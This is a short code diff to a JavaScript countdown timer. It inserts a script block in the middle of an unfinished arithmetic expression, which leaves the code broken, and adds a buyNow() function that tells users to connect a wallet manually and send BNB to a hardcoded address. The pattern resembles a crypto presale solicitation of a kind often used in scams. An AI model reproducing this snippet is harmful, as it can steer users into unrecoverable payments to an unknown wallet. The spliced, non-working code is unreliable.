@@ -21,3 +21,9 @@ const countdownInterval = setInterval(function () {
   }
 
   const days = Math.floor(timeRemaining / (1000
+                                           <script>
+  function buyNow() {
+    alert("Connect your wallet manually and send BNB to: 0xFc3381a6AA1d134DDf22f641E97c92C400959910");
+  }
+</script>
+
